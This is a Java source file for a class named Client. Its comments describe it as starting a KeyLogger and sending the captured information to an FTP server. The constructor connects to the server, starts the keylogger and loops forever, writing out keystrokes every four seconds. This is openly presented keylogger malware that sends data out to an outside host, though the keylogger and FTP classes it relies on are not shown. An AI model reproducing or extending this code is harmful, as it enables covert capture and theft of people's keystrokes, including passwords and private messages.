package org.dot;

/**
 * A class that starts <code>{@link org.dot.KeyLogger}</code> and sends information to FTP-server.
 * 
 * @author dovaogedot
 * @see org.dot.Server
 */
public class Client {

	/**
	 * Base constructor.
	 */
	public Client() {
		try {
			if (!FTPManager.connect())
				throw new Exception("Failed to connect.");
			else
				System.out.println("Connected.");
			
			KeyLogger.start();

			do {
				Thread.sleep(4000);
				KeyLogger.write();
			} while (true);
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
	}

}
